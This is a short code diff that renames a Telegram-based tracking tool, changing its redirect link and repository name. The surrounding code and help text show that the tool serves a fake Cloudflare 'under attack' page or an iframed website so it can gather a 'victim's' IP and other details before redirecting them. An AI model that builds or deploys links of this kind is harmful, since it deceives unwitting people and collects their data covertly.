@@ -28,7 +28,7 @@ if(req.params.path != null){
 res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path});
 } 
 else{
-res.redirect("https://t.me/th30neand0nly0ne");
+res.redirect("https://t.me/dynamogamesofficial");
 }
 
          
@@ -46,7 +46,7 @@ if(req.params.path != null){
 res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path});
 } 
 else{
-res.redirect("https://t.me/th30neand0nly0ne");
+res.redirect("https://t.me/dynamogamesofficial");
 }
 
          
@@ -81,7 +81,7 @@ the url it will send you 2 links which you can use to track people.
 \n1. Cloudflare Link: This method will show a cloudflare under attack page to garher informations and afterwards victim will be redirected to destinationed URL.
 \n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
 ( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
-\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
+\n\nThe project is OSS at: https://github.com/dynamogamesofficial/TrackHim
 `);
 }
   
